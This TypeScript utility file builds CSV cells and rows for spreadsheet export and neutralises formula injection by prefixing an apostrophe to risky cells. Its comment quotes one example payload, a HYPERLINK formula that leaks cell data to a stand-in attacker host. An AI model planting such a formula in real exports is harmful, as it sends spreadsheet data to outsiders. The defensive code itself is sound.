/**
 * CSV for files a person will open in a spreadsheet.
 *
 * Some of these values are written by anonymous visitors (search queries,
 * page slugs). Excel, Sheets and LibreOffice evaluate any cell that starts with
 * `=`, `+`, `-`, `@`, tab or CR as a formula, so a query like
 * `=HYPERLINK("https://evil.example/?"&A2, "open")` ran on the admin's machine
 * the moment the export was opened. Such cells get a leading apostrophe, the
 * convention spreadsheets read as "this is text". Every cell is quoted, so a
 * comma or newline in a value cannot shift the columns either.
 */
const FORMULA_START = /^[=+\-@\t\r]/

export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return '""'
  let text = value instanceof Date ? value.toISOString() : String(value)
  if (typeof value === "string" && FORMULA_START.test(text)) text = `'${text}`
  return `"${text.replace(/"/g, '""')}"`
}

/**
 * `;` is what a Spanish-locale Excel expects (its decimal separator is the
 * comma), so exports offer it; the quoting above keeps either one safe.
 */
export function csvRow(values: readonly unknown[], separator: "," | ";" = ","): string {
  return `${values.map(csvCell).join(separator)}\n`
}

/** Excel only detects UTF-8 (accents in Spanish names) with a BOM. */
export const UTF8_BOM = "﻿"
